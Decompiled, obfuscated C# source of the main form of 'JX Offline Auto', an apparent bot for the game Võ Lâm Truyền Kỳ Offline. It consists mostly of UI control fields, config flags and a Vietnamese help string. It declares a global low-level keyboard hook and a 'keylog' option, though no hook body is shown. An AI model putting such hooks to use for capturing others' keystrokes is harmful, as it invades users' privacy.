using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using ns1;
using ns101;
using ns102;
using ns103;
using ns104;
using ns105;
using ns106;
using ns107;
using ns108;
using ns109;
using ns11;
using ns110;
using ns111;
using ns112;
using ns113;
using ns114;
using ns115;
using ns116;
using ns117;
using ns118;
using ns119;
using ns120;
using ns121;
using ns122;
using ns123;
using ns124;
using ns125;
using ns126;
using ns127;
using ns128;
using ns129;
using ns13;
using ns130;
using ns132;
using ns133;
using ns134;
using ns135;
using ns136;
using ns137;
using ns138;
using ns139;
using ns140;
using ns141;
using ns142;
using ns143;
using ns144;
using ns145;
using ns146;
using ns148;
using ns149;
using ns150;
using ns17;
using ns19;
using ns2;
using ns23;
using ns25;
using ns27;
using ns28;
using ns29;
using ns3;
using ns33;
using ns34;
using ns35;
using ns36;
using ns37;
using ns39;
using ns4;
using ns40;
using ns43;
using ns44;
using ns45;
using ns46;
using ns47;
using ns48;
using ns49;
using ns5;
using ns53;
using ns56;
using ns6;
using ns61;
using ns63;
using ns66;
using ns67;
using ns68;
using ns71;
using ns72;
using ns76;
using ns77;
using ns79;
using ns81;
using ns83;
using ns85;
using ns88;
using ns98;
using ns99;

namespace ns100;

public class Form1 : Form
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int int_0 = 13;

	private const int int_1 = 256;

	private const int int_2 = 82;

	private LowLevelKeyboardProc lowLevelKeyboardProc_0 = smethod_6;

	private static IntPtr intptr_0 = IntPtr.Zero;

	private static bool bool_0 = false;

	private Label label55;

	private ComboBox comboBoxSelectOverlayItemCount;

	private TabPage tabPagetrangbi;

	private PictureBox pictureBox1;

	private TabControl tabControl4;

	private TabPage tabPagedoxanh;

	private TabPage tabPageHKMP;

	private static Form1 form1_0 = null;

	private bool bool_1 = false;

	private Label label41;

	private TextBox textBox5;

	private CheckBox toadotk;

	private TabPage uutien;

	public CheckBox checkBox2;

	private bool bool_2 = false;

	private System.Windows.Forms.Timer timer_0;

	private int int_3 = 0;

	private Class18 class18_0;

	private bool bool_3 = false;

	private bool bool_4 = false;

	private uint[] uint_0 = null;

	private System.Windows.Forms.Timer timer_1;

	private TabPage tabPage10;

	private TextBox lenh6;

	private TextBox lenh5;

	private TextBox lenh4;

	private TextBox lenh3;

	private TextBox lenh2;

	private TextBox lenh1;

	private Button caidatlenh;

	private Label label48;

	private Label label47;

	private Label label46;

	private Label label45;

	private Label label44;

	private Label label43;

	private Label label50;

	private Label label49;

	private GroupBox groupBox9;

	private TextBox lenh7;

	private Button button2;

	private Label label51;

	private GroupBox groupBox10;

	private Label label52;

	private LinkLabel linkLabel3;

	private CheckBox hienthithongke;

	private TextBox timequaylai;

	private CheckBox baodskenhbang;

	private CheckBox sanboss1cho;

	private TextBox textBoxtimettl;

	private Label label53;

	private CheckBox checkBoxoverlay;

	private ComboBox comboBoxcauhinh;

	private Label label35;

	private CheckBox checkDungHieuUng;

	private ComboBox comboBoxHieuUng;

	private CheckBox checkBoxDungHieuUng2;

	private ComboBox comboBoxdanhtennv;

	private CheckBox checkBoxdanhtennv;

	private CheckBox checkBoxdamekethop;

	private CheckBox checkBoxkhoamuctieu;

	private CheckBox checkBoxChayNhay;

	private Button buttonxoauutiennv;

	private ListView listViewdanhtennv;

	private DateTime dateTime_0 = DateTime.MinValue;

	private LinkLabel linkLabel5;

	private Label label54;

	private CheckBox checkBoxkepgoc;

	private static string[] string_0 = null;

	private CharacterAccountConfig characterAccountConfig_0;

	private bool bool_5 = false;

	private System.Windows.Forms.Timer timer_2;

	private Dictionary<string, object> dictionary_0 = new Dictionary<string, object>();

	private TabPage pkdon;

	private CheckBox tocbien;

	private IContainer icontainer_0 = null;

	private const uint uint_1 = 2u;

	private NotifyIcon notifyIcon_0;

	private System.Windows.Forms.Timer timer_3;

	private GForm0 gform0_0;

	public static bool bool_6 = true;

	public static bool bool_7 = false;

	public static bool bool_8 = false;

	public static bool bool_9 = false;

	public static bool bool_10 = false;

	private bool bool_11 = false;

	private float float_0 = 8f;

	private TextBox textBoxKhoangCachAccChinh;

	private CheckBox checkBoxTimTrongthanh;

	private ComboBox comboBoxAccChinh;

	private ComboBox comboBoxIndex;

	private CheckBox checkBoxTimAccchinh;

	private Button buttonOff;

	private Button buttonAdd;

	private RichTextBox richTextBoxStatus;

	private ListView listView1;

	private ColumnHeader columnHeader_0;

	private ColumnHeader columnHeader_1;

	private ColumnHeader columnHeader_2;

	private TabControl tabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private Button buttonThumucAuto;

	private Button buttonToShortcut;

	private Label label1;

	private Button buttonBrowseGame;

	private TextBox textBoxThuMuc;

	private TextBox textBoxHPBom;

	private TextBox textBoxThoigianBomHP;

	private CheckBox checkBoxMPBom;

	private TextBox textBoxSoluongBomHP;

	private TextBox textBoxMPBom;

	private TextBox textBoxSoluongBomMP;

	private TextBox textBoxThoigianBomMP;

	private CheckBox checkBoxBomHP;

	private TextBox textBoxBomHPDiem;

	private TextBox textBoxThoiGianBomHPDiem;

	private CheckBox checkBoxBomMPDiem;

	private TextBox textBoxSoLuongBomHPDiem;

	private TextBox textBoxBomMPDiem;

	private TextBox textBoxSoLuongBomMPDiem;

	private TextBox textBoxThoiGianBomMPDiem;

	private CheckBox checkBoxBomHPDiem;

	private TextBox textBoxPass;

	private Label label4;

	private TextBox textBoxTienMangtheo;

	private TextBox textBoxSoluongTDP;

	private CheckBox checkBoxMangtheotien;

	private CheckBox checkBoxHPTdp;

	private TextBox textBoxMPTdp;

	private CheckBox checkBoxMPTdp;

	private TextBox textBoxHpTDP;

	private ComboBox comboBoxMua1;

	private CheckBox checkBoxMuaTDP;

	private TextBox textBoxSoluongThuocDimua;

	private TextBox textBoxSoluong2;

	private CheckBox checkBoxMua2;

	private ComboBox comboBoxMua2;

	private TextBox textBoxSoluong1;

	private CheckBox checkBoxMua1;

	private TextBox textBoxIDSudung;

	private Label label11;

	private Button buttonTrial;

	private Button buttonCapnhat;

	private Button buttonDangky;

	private Button buttonIDApdung;

	private TabControl tabControl3;

	private TabPage tabPageBang1;

	private ComboBox comboBoxAccDoiMau;

	private Button buttonLogin;

	private CheckBox checkBoxPhimTat;

	private TextBox textBoxChatNham;

	private CheckBox checkBoxChatNham;

	private Button buttonFormTest;

	private Button buttonTest;

	private CheckBox checkBoxTamQuet;

	private TextBox textBoxKhoangCachTiepcan;

	private TextBox textBoxPhamvi;

	private CheckBox checkBoxTiepCan;

	private CheckBox checkBoxUutienDanhquai;

	private CheckBox checkBoxDanhquai;

	private CheckBox checkBoxTuve;

	private CheckBox checkBoxChetnamIm;

	private CheckBox checkBoxNgamyBuff;

	private TextBox textBoxTimerNgamyBuff;

	private TextBox textBoxNgamyBuff;

	private Button buttonNgaMybuff;

	private Button buttonCashBua;

	private CheckBox checkBoxTuCastBua;

	private Button buttonLoaitruAccBuff;

	private ComboBox comboBoxNhatdo;

	private CheckBox checkBoxNhatdo;

	public ComboBox comboBoxUuTien;

	private Button buttonTatcaTDP;

	private Button buttonTatcaLuuruong;

	private Button buttonBungThuoc;

	private Button buttonThongke;

	private Button buttonSuadoTaicho;

	private Button buttonComboNhoithuoc;

	private Button buttonVang;

	private Button buttonXanh;

	private Button buttonTim;

	private CheckBox checkBoxAccPhuHauDoanh;

	private CheckBox checkBoxAccChinhHauDoanh;

	private CheckBox checkBoxMuaMauFree;

	private ComboBox comboBoxVaodiemBaodanh;

	private ComboBox comboBoxBentau;

	private Button buttonNopLenhbaiAll;

	private Button buttonNopLenhbai;

	private Button buttonVaotraiStopAll;

	private Button buttonVaotraiStop;

	private CheckBox checkBoxTuGiaidoc;

	private Button buttonAppDungBomMauAll;

	private Button buttonApDungMuaThuocAll;

	private TextBox textBoxSoluongBomMagic;

	private TextBox textBoxTimerBomMagic;

	private ComboBox comboBoxMuaGiaiDoc;

	private TextBox textBoxSoluongMuaGiaiDoc;

	private CheckBox checkBoxMuaGiaiDoc;

	private CheckBox checkBoxGiamRamTudong;

	private ComboBox comboBoxGameOfWeb;

	private Label label6;

	private TabPage tabPage7;

	private ComboBox comboBoxGanChieuPhai;

	private ComboBox comboBoxGanChieuTrai;

	private CheckBox checkBoxGanChieuPhai;

	private CheckBox checkBoxGanChieuTrai;

	private TabPage tabPage9;

	private CheckBox checkBoxTrinhSat;

	private Button buttonGiaiThichHaucan;

	private Label label14;

	private TextBox textBoxScrMouseXY;

	private TextBox textBoxRealMouseXY;

	private TextBox textBoxScrPosXY;

	private Label label13;

	private TextBox textBoxRealPosXY;

	private CheckBox checkBoxAnThuocLag;

	private ComboBox comboBoxTheoSau;

	private TextBox textBoxKhoangCachTheoSau;

	private Label labelTheoSauAll;

	private ComboBox comboBoxClickNPC;

	private TextBox textBoxClickNPCMenu;

	private CheckBox checkBoxClickNPCmenu;

	private Button buttonHuongdanHLP;

	private TextBox textBoxClickNPCSolan;

	private CheckBox checkBoxClickNPCSolan;

	private TextBox textBoxClickNPCTocdo;

	private CheckBox checkBoxGioClick;

	private NumericUpDown numericUpDownSS;

	private NumericUpDown numericUpDownMM;

	private NumericUpDown numericUpDownHH;

	private TabControl tabControlHaucan;

	private TabPage tabPageMuathuoc;

	private TabPage tabPagePhuchoi;

	private TabPage tabPageBang2;

	private Label label17;

	private ComboBox comboBoxChienTruong;

	private ComboBox comboBoxChienTruongMapPhu;

	private CheckBox checkBoxTHPCTC;

	private CheckBox checkBoxMapPhu;

	private TabControl tabControlPhutro;

	private TabPage tabPage4;

	private TabPage tabPageTinsu;

	private CheckBox checkBoxAccChinhTudieukhienCTC;

	private CheckBox checkBoxChienLongdong;

	private ComboBox comboBoxCLD;

	private CheckBox checkBoxTrain;

	private TextBox textBoxMapName;

	private ListView listViewTrain;

	private ColumnHeader columnHeader_3;

	private TabPage tabPageTinhLuyen;

	private Button buttonLuutep;

	private Button buttonDoctep;

	private Button buttonXoaToadoTrain;

	private Button buttonLayToadoTrain;

	private ColumnHeader columnHeader_4;

	private CheckBox checkBoxNhatdoDichuyenGan;

	private Button buttonApdungAllTrain;

	private CheckBox checkBoxTranhBossVang;

	private CheckBox checkBoxTDPSaimap;

	private TabPage tabPageCTC;

	private TabPage tabPageTrain;

	private CheckBox checkBoxChaydanhvong;

	private CheckBox checkBoxMuathuocPK;

	private CheckBox checkBoxChayPKNguoidung;

	private Label label24;

	private ComboBox comboBoxDoSatcuuSat;

	private Button buttonXoaIDAcChinh;

	private Button buttonBaoToado;

	private Button buttonMoGame;

	private TabControl tabControl2;

	private TabPage tabPage14;

	private Button buttonMorong;

	public Button buttonUuTien;

	private CheckBox checkBoxOluonMapphu;

	private Button buttonBungTuimau;

	private CheckBox checkBoxVeThanhKhiPKlon;

	private Button buttonAnhet;

	private ComboBox comboBoxGiamCpu;

	private Button buttonGiamCPUAll;

	private CheckBox checkBoxDameMacdinh;

	private Button buttonDame;

	private Button buttonBossAll;

	private Button buttonSuaXoa;

	private ComboBox comboBoxNoiBoss;

	private CheckBox checkBoxTuChayBoss;

	private ColumnHeader columnHeader_5;

	private ColumnHeader columnHeader_6;

	private TextBox textBoxPhamviNhat;

	private CheckBox checkBoxLuomrac;

	private TextBox textBoxSLThoat;

	private CheckBox checkBoxSLThoat;

	private ComboBox comboBoxXuongNgua;

	private Label labelKieudame;

	private CheckBox checkBoxPheThu;

	private Label label2;

	private Button buttonThuocTDD;

	private TextBox textBoxTocdoDanh;

	private CheckBox checkBoxAnThuocTDD;

	private Button buttonThuocLag;

	private TabControl tabControlLoc;

	private ComboBox comboBoxBosSatthu;

	private Button buttonPhimHDCTC;

	private TabControl tabControlThatThanh;

	private TabPage tabPageThatthanh;

	private TabPage tabPageTamtru;

	private Button buttonLayvitriCongTamtru;

	private TextBox textBoxCongTamtru;

	private Label label30;

	private TextBox textBoxToadoHieuthuocTamtru;

	private Label label28;

	private ComboBox comboBoxTenHieuThuocTamtru;

	private Button buttonPhimHdTamtru;

	private TextBox textBoxTDP_SL_Mana;

	private TextBox textBoxTDP_SL_Mau;

	private CheckBox checkBoxTDP_SL_Mana;

	private CheckBox checkBoxTDP_SL_Mau;

	private CheckBox checkBoxKhongLuuruong;

	private CheckBox checkBoxMana2;

	private CheckBox checkBoxMau2;

	private ComboBox comboBoxTenMana2;

	private TextBox textBoxTimerMana2;

	private TextBox textBoxRatioMana2;

	private TextBox textBoxSoluongMana2;

	private ComboBox comboBoxTenMau2;

	private TextBox textBoxSoluongMau2;

	private TextBox textBoxTimerMau2;

	private TextBox textBoxRatioMau2;

	private Button buttonThietLapDuongMon;

	private CheckBox checkBoxDuongMonBoom;

	private CheckBox checkBoxUuTienBomCuuchuyen;

	private Label label29;

	private ComboBox comboBoxOtrong;

	private CheckBox checkBoxOtrong;

	private Button buttonThoatHetgame;

	private TabPage tabPageMuaDung;

	private TextBox textBoxMenuTest;

	private Label label33;

	private Label label32;

	private ComboBox comboBoxTrangbiTest;

	private Button buttonTatcaNhanTrangbiTest;

	private Button buttonDungTatcaTrangbiTest;

	private Button buttonNhanTrangbiTest;

	private Button buttonPhimHDLoc;

	private Button buttonLocTrangbi;

	private Button buttonThietlapClickNpc;

	private CheckBox checkBoxTongKimXemSoluong;

	private LinkLabel linkLabelTrangchu;

	private Button buttonHuongDan;

	private CheckBox checkBoxRuong3;

	private CheckBox checkBoxRuong1;

	private Button buttonTuyChonMonPhai;

	private CheckBox checkBoxRuong2;

	private CheckBox checkBoxRuong0;

	private Button buttonKhongcat;

	private Label label18;

	private CheckBox checkBoxXepdo;

	private Button buttonTimTrongthanh;

	private Label labelChuadaydu;

	private Button buttonLayVitriXaphuCTQ;

	private Label label34;

	private Label label15;

	private TextBox textBoxTimeXepdo;

	private CheckBox checkBoxNPC;

	private TextBox textBoxOso1;

	private TextBox textBoxOso2;

	private TextBox textBoxOso3;

	private CheckBox checkBoxGanTenthuoc;

	private Button buttonDenDiemKetiep;

	private CheckBox checkBoxTudongPT;

	private CheckBox checkBoxTucheHT;

	private TabPage tabPageChieuthuc;

	private Button buttonSkill120vd;

	private CheckBox checkBoxTuGiaiBua;

	private Button buttonSkill120tn;

	private CheckBox checkBoxTNXuatChieu120;

	private Button buttonDanhsachCuusat;

	private CheckBox checkBoxDanhquaiTrain;

	private CheckBox checkBoxTDPHettien;

	private CheckBox checkBoxToadoVong;

	private LinkLabel linkLabelPhimChaynhim;

	private TabPage tabPage15;

	private Label label38;

	private TextBox textBoxTenacTimVST;

	private TextBox textBoxThoigianVST;

	private CheckBox checkBoxBaokenhbang;

	private Button buttonPasteVST;

	private Button buttonCopyVST;

	private TextBox textBoxToadoVST;

	private TextBox textBoxMapNameVST;

	private CheckBox checkBoxRoom;

	private Button buttonMuctieu;

	private CheckBox checkBoxCungMucTieu;

	private RichTextBox richTextBoxChedoMayphu;

	private TextBox textBoxNhapSLTest;

	private TextBox textBoxNhapSoluongClickNPC;

	private CheckBox checkBoxDanhQuaiTrenduongdi;

	private TabControl tabControl6;

	private TabPage tabPage16;

	private TabPage tabPage18;

	private Label label42;

	private CheckBox checkBoxQuayquai;

	private TabControl tabControlChuyenSkill;

	private TabPage tabPage19;

	private TabPage tabPage20;

	private Button buttonFixGameTuthoat;

	private CheckBox checkBoxGameHu;

	private GroupBox groupBox1;

	private ComboBox comboBoxTranphai1;

	private ComboBox comboBoxTranphai2;

	private TextBox textBoxTranphai2;

	private TextBox textBoxTranphai1;

	private CheckBox checkBoxTranphai1;

	private CheckBox checkBoxTranphai3;

	private ComboBox comboBoxTranphai3;

	private CheckBox checkBoxTranphai2;

	private TextBox textBoxTranphai3;

	private ComboBox comboBoxChuyenThuoc;

	private TextBox textBoxSoluongChuyenthuoc;

	private CheckBox checkBoxTubaoDanh;

	private CheckBox checkBoxVaomapAchinh;

	private Button buttonTuTimWeb;

	private Button buttonLuuCauhinhAll;

	private CheckBox checkBoxTatMuamauTK;

	private Button buttonToadoPK;

	private CheckBox checkBoxChayTinsu;

	private CheckBox checkBoxBatdauVanSuthong;

	private Label label9;

	private Label label3;

	private ComboBox comboBoxTinSu;

	private Button buttonPhimTat;

	private CheckBox checkBoxNhatqua;

	private Label labelLocdo;

	private CheckBox checkBoxBossSatthu;

	private GroupBox groupBox6;

	private GroupBox groupBox4;

	private CheckBox checkBoxONha;

	private Button buttonSatthuAll;

	private Button buttonNhatquaAll;

	private Button buttonTinsuAll;

	private CheckBox checkBoxGhepSTG;

	private Button buttonGhepSTG;

	private GroupBox groupBox3;

	private CheckBox checkBoxBossSTtuhuy;

	private TabPage tabPageLocTrangbi;

	private CheckBox checkBoxMuaKytrancac;

	private CheckBox checkBoxGopVatpham;

	private Label label16;

	private ComboBox comboBoxMuaVatpham;

	private PictureBox pictureBoxQC;

	private TextBox textBoxIdMua;

	private Button buttonHelp;

	private ComboBox comboBoxPk;

	private TextBox textBox3;

	private TextBox textBox2;

	private TextBox textBox1;

	private TextBox textBoxMuadungSoLuong;

	private CheckBox checkBoxMuaDungSoluong;

	private CheckBox checkBoxBoquaMaKTC;

	private Button buttonHelpMua;

	private Button buttonStopNhatqua;

	private Label label12;

	private ComboBox comboBoxPhuong;

	private Button buttonTHP;

	private ComboBox comboBoxTHP;

	private Button buttonBaoBoss;

	private CheckBox checkBoxBosBaobos;

	private Button buttonBoss;

	private Button buttonNamIm;

	private Button buttonPT;

	private TextBox textBoxChuyenThuocMin;

	private Label label5;

	private CheckBox checkBoxTuChuyenThuoc;

	private CheckBox checkBoxRuongBH;

	private TabControl tabControl5;

	private TabPage tabPage6;

	private TabPage tabPage11;

	private Button buttonHDChuyenthuoc;

	private Label label8;

	private CheckBox checkBoxBamPhimCong;

	private CheckBox checkBoxTTL;

	private Button buttonDocCauhinh;

	private Button buttonAchinh;

	private CheckBox checkBoxChayRunAdmin;

	private TextBox textBoxPhamviNhatqua;

	private TabPage tabPageTongKim;

	private CheckBox checkBoxDenToadoUser;

	private Button buttonLayToado;

	private Button buttonXoaToado;

	private TextBox textBoxToadoDen;

	private CheckBox checkBoxDenToadoALL;

	private Button buttonHuongdanCanhbos;

	private GroupBox groupBox2;

	private CheckBox checkBoxLocTrangbiNPC;

	private CheckBox checkBoxLocTrangbiNhapSL;

	private CheckBox checkBoxTKThanhTruot;

	private Button buttonDoSat;

	private CheckBox checkBoxDanhHieuuy;

	private TextBox textBoxTruotTK;

	private CheckBox checkBoxThanhTruotSudung;

	private LinkLabel linkLabelPhimCauca;

	private CheckBox checkBoxMuaKTC;

	private Button buttonKyTranCac;

	private Button buttonMuathuocBaovat;

	private TabPage tabPage5;

	private RichTextBox richTextBox1;

	private Label label20;

	private Label label19;

	private Label label10;

	private TabPage tabPage8;

	private CheckBox checkBoxVuotAi;

	private Button buttonThoatGame;

	private CheckBox checkBoxDiemTapket;

	private Button buttonDiemTapket;

	private CheckBox checkBoxConLon;

	private CheckBox checkBoxBossSTKhongLamHaucan;

	private TabPage tabPageTest;

	private Button buttonHuyenTinh;

	private Button buttonRaovat;

	private RichTextBox richTextBoxBHO;

	private CheckBox checkBoxChoPTdanhsach;

	private TextBox textBoxTimerPT;

	private LinkLabel linkLabelHelpTinsu;

	private CheckBox checkBoxQuangThuoc;

	private Button buttonQuangThuoc;

	private GroupBox groupBox7;

	private Button buttonHelpClickNpc;

	private Button buttonClickNpcStopAll;

	private Button buttonClickNpcAll;

	private Button buttonClickNpcSingle;

	private Button buttonMuaGopAll;

	private Button buttonMuaSudungAll;

	private TabPage tabPage12;

	private Button buttonDsBanVatpham;

	private CheckBox checkBoxBanVpham;

	private Button buttonBanVatphamRac;

	private Button buttonOpenAllWeb;

	private ComboBox comboBoxTrinhsat;

	private CheckBox checkBoxBaoKeylog;

	private TextBox textBoxClickMenuTS;

	private CheckBox checkBoxDenToadoLeave;

	private CheckBox checkBoxTHPChienLong;

	private GroupBox groupBox8;

	private TabPage tabPageTamMondai;

	private Label label26;

	private ComboBox comboBoxCTC;

	private Label label27;

	private Button buttonLayMapTamMondai;

	private TextBox textBoxTamMonDaiMapId;

	private Button buttonMapTamMondaiMacdinh;

	private RichTextBox richTextBox2;

	private Label label23;

	private Button buttonResetAuto;

	private Button buttonTamMonDaiHD;

	private CheckBox checkBoxNhapSLClickNpc;

	private TextBox textBoxVukhi1;

	private TextBox textBoxVukhi0;

	private ComboBox comboBoxVukhiKieu1;

	private ComboBox comboBoxVukhiKieu0;

	private CheckBox checkBoxVukhi1;

	private ComboBox comboBoxVukhi1;

	private CheckBox checkBoxVukhi0;

	private ComboBox comboBoxVukhi0;

	private RichTextBox richTextBox3;

	private TextBox textBoxLocTocdo;

	private Label label31;

	private Button buttonTatcaMuamau;

	private Button buttonStopMuamau;

	private Button buttonCongHauDoanh;

	private Button buttonStopSudungAll;

	private Button buttonStopSudung;

	private Button buttonBatdauSudung;

	private Button buttonBatdauMua;

	private CheckBox checkBoxCaudame;

	private TextBox textBoxCaudame;

	private ComboBox comboBoxKieudiCLD;

	private Button buttonTatCaBanVatPhamRac;

	private Button buttonTangdiem;

	private Button buttonBuffLaiTranphai;

	private CheckBox checkBoxTatBuffTamthoi;

	private TabPage tabPageBaoVat;

	private CheckBox checkBoxTTDT;

	private TextBox textBoxMuaMienphiMenu;

	private Button buttonMenuLocClick;

	private ComboBox comboBoxKieu3;

	private ComboBox comboBoxKieu2;

	private ComboBox comboBoxKieu1;

	private TextBox textBoxChuyenTrai3;

	private ComboBox comboBoxChuyenTrai1;

	private CheckBox checkBoxChuyenTrai1;

	private ComboBox comboBoxChuyenTrai2;

	private ComboBox comboBoxChuyenTrai3;

	private CheckBox checkBoxChuyenTrai3;

	private TextBox textBoxChuyenTrai1;

	private CheckBox checkBoxChuyenTrai2;

	private TextBox textBoxChuyenTrai2;

	private TextBox textBoxChuyenPhai3;

	private ComboBox comboBoxChuyenPhai1;

	private ComboBox comboBoxChuyenPhai2;

	private CheckBox checkBoxChuyenPhai3;

	private CheckBox checkBoxChuyenPhai2;

	private TextBox textBoxChuyenPhai2;

	private TextBox textBoxChuyenPhai1;

	private ComboBox comboBoxChuyenPhai3;

	private CheckBox checkBoxChuyenPhai1;

	private TabPage tabPage22;

	private CheckBox checkBoxGapBossNL;

	private TextBox textBoxGapBoss;

	private ComboBox comboBoxGapBoss;

	private CheckBox checkBoxGapBossChieu;

	private Label label39;

	private Button buttonNpcClickMenu;

	private CheckBox checkBoxThanhTruot;

	private TextBox textBoxThoiGianTruot;

	private CheckBox checkBoxDungCodinh;

	private ComboBox comboBoxNhatQua;

	private Button buttonResetTenNhatQua;

	private Label label7;

	private ComboBox comboBoxBanVatPham;

	private Button buttonTudoiMaubang;

	private Label labelLocBando;

	private Button buttonBandoCTC;

	private CheckBox checkBoxTuChayVA;

	private Button buttonBatGiaodichAll;

	private LinkLabel linkLabelPhimPhichiendau;

	private GroupBox groupBox5;

	private CheckBox checkBoxTienSkill;

	private Button buttonTienSkill;

	private LinkLabel linkLabelMuaMienphiMn;

	private CheckBox checkBoxKhongNhapso;

	private CheckBox checkBoxHoasonMuathuoc;

	private CheckBox checkBoxMuaThon;

	private CheckBox checkBoxMuaNgamy;

	private CheckBox checkBoxTatmuaAll;

	private CheckBox checkBoxDoiTitle;

	private ComboBox comboBoxTenThuocMienphi;

	private CheckBox checkBoxChuyenChinhxac;

	private LinkLabel linkLabel1;

	private CheckBox checkBoxTuClickNTT;

	private LinkLabel linkLabel2;

	private Button buttonNhiepTT;

	private Button buttonMd;

	private CheckBox checkBoxVeThanhCt;

	private Button buttonTC;

	private Button button1;

	private Button buttonDongtien;

	private Label label36;

	private TextBox textBoxMapId;

	private CheckBox checkBoxVSTDong2;

	private Label label21;

	private Button buttonReset1ac;

	private Button buttonCopyPosXY;

	private CheckBox checkBoxGame;

	private Label label37;

	private TextBox textBoxDelta;

	private TextBox textBoxStart;

	private TabPage tabPage3;

	private CheckBox checkBoxThu;

	private TextBox textBoxXoaMn;

	private CheckBox checkBoxXoaMn;

	private Label label40;

	private Label labelToadoTrinhsat;

	private CheckBox checkBoxTuChonClick;

	private Label label22;

	private TextBox textBox4;

	public static string string_1 = "12.0";

	public static string string_2 = "JX Offline Auto";

	public static string string_3 = "JX Offline Auto";

	public static string string_4 = "KYKeoxe.exe";

	public static string string_5 = "KYKeoxe.exe";

	public static bool bool_12 = false;

	public static bool bool_13 = false;

	public static bool bool_14 = false;

	public static bool bool_15 = false;

	public static string string_6 = string.Empty;

	public static int int_4 = -1;

	public static int int_5 = 0;

	public static string[,] string_7 = new string[1, 6]
	{
		{ "JX Offline - Mel", "VËt phÈm", "2000", "1,5", "Game.exe", "1" }
	};

	private static string[,] string_8 = new string[3, 6]
	{
		{ "vocongtruyenky.net", "Hç Trî", "39", null, "vgGame.exe", null },
		{ "volamhaingoai.com", "T¹p hãa", "1015", "1", "vggame.exe", "1" },
		{ "volamhaingoaius.com", "T¹p hãa", "1015", "1", "vggame.exe", "1" }
	};

	public static string[] string_9 = new string[1] { " " };

	public static string string_10 = "Cập nhật ở phiên bản này:||Thêm phím tắt tất cả ac cùng quăng đồ (CTRL + ALT + F).||Các bạn qua tab Phụ trợ bấm nút xem phim < Hướng dẫn tự tìm Web của game > rồi làm theo nhé.||PHẦN TAB CÀI GAME CỦA AUTO:|- Hãy chọn lại Web của game nếu chưa đúng, ac sẽ không đi được THP nếu không đúng web.|- Bấm nút Reset cấu hình auto nếu ac game thường xuyên bị lỗi.||===========================|Hướng dẫn lần đầu sử dụng:||1. Nếu xài Windows 7, 8 hoặc 10 thì chuột phải vào tệp Auto, rồi chọn dòng Run as admin...||2. Khi thoát ac thì thoát luôn game, đừng thoát ac A rồi lại log ac B trên cùng 1 game, vì auto sẽ lưu config ac A vào ac B dẫn đến hiện tượng ac B không đánh được.||3. Tab cài  game nếu không tìm thấy trang web thì chọn dòng <khác>)|4. Bấm nút [A] trên auto để ép ac vào sử dụng.||- Bấm F10 để bỏ giảm nếu muốn.||- Chữ màu nâu đỏ là áp dụng cho toàn cục, còn màu đen hoặc xanh thì áp dụng cho từng ac.||JX Offline Auto dùng cho game Võ Lâm Truyền Kỳ Offline by MEL.|Đây là dự án Phi Thương Mại - Miễn Phí 100%";

	public static int int_6 = 0;

	public static int int_7 = 1;

	public static bool bool_16 = false;

	public static bool bool_17 = false;

	public static bool bool_18 = false;

	public static int int_8 = Class66.smethod_4("flagCoClickVaoNPC", 0, "1");

	public static int int_9 = Class66.smethod_4("SaisoBaovat", 0, "0");

	public static int int_10 = 0;

	public static int int_11 = 0;

	public static int int_12 = Class66.smethod_4("flagBaoroom", 0, "0");

	public static int int_13 = Class66.smethod_4("flagKhoaChatmat", 0, "1");

	public static int int_14 = Class66.smethod_4("KhongHienThiVideoHelp", 0, "0");

	public static int int_15 = Class66.smethod_4("flagLienthongMapAB", 0, "1");

	public static int int_16 = Class66.smethod_4("SoluongThuocMoilanMo", 0, "10");

	public static int int_17 = Class66.smethod_4("PCDKhongMoTui", 0, "1");

	public static int int_18 = Class66.smethod_4("flagBaoCuusatMat", 0, "1");

	public static int int_19 = Class66.smethod_4("flagBaoCuusatBang", 0, "1");

	public static int int_20 = Class66.smethod_4("flagBaoCuusatPhucan", 0, "0");

	public static int int_21 = Class66.smethod_4("LuonGanPhimtat", 0, "0");

	public static int int_22 = 1;

	public static int int_23 = Class66.smethod_4("flagKhongChaybo", 0, "1");

	public static int int_24 = Class66.smethod_4("IndexPK", 0, "0");

	public static int int_25 = Class66.smethod_4("flagTimAccchinh", 0, "1");

	public static int int_26 = Class66.smethod_4("flagTimtrongthanh", 0, "1");

	public static int int_27 = Class66.smethod_4("KhoangcachAccchinh", 0, "200");

	public static int int_28 = 0;

	public static int int_29 = 0;

	public static int int_30 = Class66.smethod_4("TamMonDaiMapID", 0, "221");

	public static int int_31 = Class66.smethod_4("fQuangThuocAchinh", 0, "1");

	public static int int_32 = Class66.smethod_4("fQuangThuocTDP", 0, "0");

	public static int int_33 = Class66.smethod_4("fMuaNoiChiendau", 0, "0");

	public static int int_34 = Class66.smethod_4("flagDanhnguoi", 0, "1");

	public static int int_35 = Class66.smethod_4("flagDanhquai", 0, "1");

	public static int int_36 = Class66.smethod_4("flagUutienBoss", 0, "0");

	public static int int_37 = Class66.smethod_4("flagCungMuctieu", 0, "1");

	public static int int_38 = Class66.smethod_4("flagTutimMuctieu", 0, "1");

	public static int int_39 = 1;

	public static int int_40 = Class66.smethod_4("BossTruocNguoiSau", 0, "0");

	public static int int_41 = Class66.smethod_4("ChetNamImAll", 0, "0");

	public static int int_42 = Class66.smethod_4("fNamImONOFF", 0, "0");

	public static int int_43 = 10;

	public static int int_44 = Class66.smethod_4("flagOLuonMapPhu", 0, "1");

	public static string string_11 = Class11.smethod_15(Class66.smethod_7("TenAcCantimVST", 0));

	public static int int_45 = Class66.smethod_4("flagBaoKenhBangVST", 0, "0");

	public static int int_46 = Class66.smethod_4("flagBaoKenhRoomVST", 0, "1");

	public static int int_47 = Class66.smethod_4("ThoigianVST", 0, "30");

	public static int[] int_48 = new int[2]
	{
		0,
		Class66.smethod_4("BaodanhTK", 0, "0")
	};

	public static int int_49 = Class66.smethod_4("flagVaoMapCTCCoAcchinh", 0, "1");

	public static CharacterAccountConfig[] characterAccountConfig_1 = null;

	private static int int_50 = 0;

	private static int int_51 = 10;

	private static DateTime dateTime_1 = DateTime.MinValue;

	public static int[] int_52 = null;

	public static string string_12 = Class66.smethod_7("textFindWeb", 0);

	public static int int_53 = Class66.smethod_4("flagPassKeoNhieumay", 0, "1");

